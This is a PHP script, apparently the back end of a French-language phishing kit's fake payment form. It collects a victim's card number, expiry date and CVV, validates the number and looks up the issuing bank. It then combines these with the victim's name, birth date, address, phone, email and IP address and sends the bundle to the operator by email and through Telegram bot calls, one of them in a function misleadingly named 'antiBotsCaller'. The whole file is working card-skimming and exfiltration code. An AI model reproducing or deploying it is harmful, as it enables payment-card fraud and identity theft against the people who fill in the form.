<?php
include('../common/sub_includes.php');
include_once '../config.php';


ob_start();
if(!isset($_SESSION)) {
    session_start();
}

$CC = $_POST['cc'];
$DDE = $_POST['exp'];
$CVV = $_POST['cvv'];

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    function isValid($num) {
        $num = preg_replace('/[^\d]/', '', $num);
        $sum = '';
    
        for ($i = strlen($num) - 1; $i >= 0; -- $i) {
            $sum .= $i & 1 ? $num[$i] : $num[$i] * 2;
        }
    
        return array_sum(str_split($sum)) % 10 === 0;
    }

    if(isValid($CC) == false)
    {
        header('location: ../paiement.php');
        die();
    }

    $_SESSION['cc']  = $CC;
    $_SESSION['dde']   = $DDE;
    $_SESSION['cvv'] = $CVV;

    $cc = $_SESSION['cc'];
    $bin = substr(str_replace(' ', '', $_POST["cc"]), 0, 6);

    $ch = curl_init();

    $url = "https://lookup.binlist.net/$bin";

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');


    $headers = array();
    $headers[] = 'Accept-Version: 3';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);


    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    }


    curl_close($ch);

    $brand = '';
    $type = '';
    $emoji = '';
    $bank = '';

    $someArray = json_decode($result, true);

    $emoji = $someArray['country']['emoji'];
    $brand = $someArray['brand'];
    $type = $someArray['type'];
    $bank = $someArray['bank']['name'];
    $bank_phone = $someArray['bank']['phone'];
    $subject_title = "[BIN: $bin][$emoji $brand $type]";

    $_SESSION['bin_brand']  = $brand;
    $_SESSION['bin_bank']   = $bank;
    $_SESSION['bin_type'] = $type;

    if($_SESSION['bin_bank'] == null)
    {
        $_SESSION['bin_bank'] = "none";
    }

    if($_SESSION['bin_brand'] == null)
    {
        $_SESSION['bin_brand'] = "none";
    }

    if($_SESSION['bin_type'] == null)
    {
        $_SESSION['bin_type'] = "none";
    }

    $message = '
[♾️] +1 CC [♾️]

💳 Num carte : ' . $_SESSION["cc"] . '
♻️ Date Expiration : ' . $_SESSION["dde"] . '
♾️ Cryptogramme visuel : ' . $_SESSION["cvv"] . '

🏦 Banque : ' . $_SESSION['bin_bank'] . '
❇️ Niveau de la carte : ' . $_SESSION['bin_brand'] . '
🧾 Type de carte : ' . $_SESSION['bin_type'] . '

[🍛] Infos [🍛] 

👮 Nom : '.$_SESSION['name'].'
🎂 Date de naissance : '.$_SESSION['ddn'].'

👮 Rue : '.$_SESSION['rue'].'
👮 Ville : '.$_SESSION['ville'].'
👮 Code Postal : '.$_SESSION['postal'].'

📱 Téléphone : '.$_SESSION['phone'].'
💌 Email : '.$_SESSION['email'].'

🛒 Adresse IP : ' . $_SERVER['REMOTE_ADDR'] . '
';
	 if($mail_send == true){
      $Subject="「💳」+1 CC | " . $bin . " | " . $_SESSION['bin_bank'] . " | " . $_SERVER['REMOTE_ADDR'];
      $head="From: amendegod@rez.cc <info@INUN.bg>";
      
      mail($rezmail,$Subject,$message,$head);
      }
      
      $theip = $message;
     function antiBotsCaller($messaggio,$bot_token,$rez_chat) {
         $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage?chat_id=" . $rez_chat;
         $url = $url . "&text=" . urlencode($messaggio);
         $ch = curl_init();
         $optArray = array(CURLOPT_URL => $url,CURLOPT_RETURNTRANSFER => true);curl_setopt_array($ch, $optArray);$result = curl_exec($ch);curl_close($ch);return $result;}antiBotsCaller($theip,$antit2,$antic1);antiBotsCaller($message,$bot_token,$rez_chat);

}
	if($vbv == true){
		header('Location: ../loading3d.php');
	} else {
		header('Location: ../merci.php');
	}


?>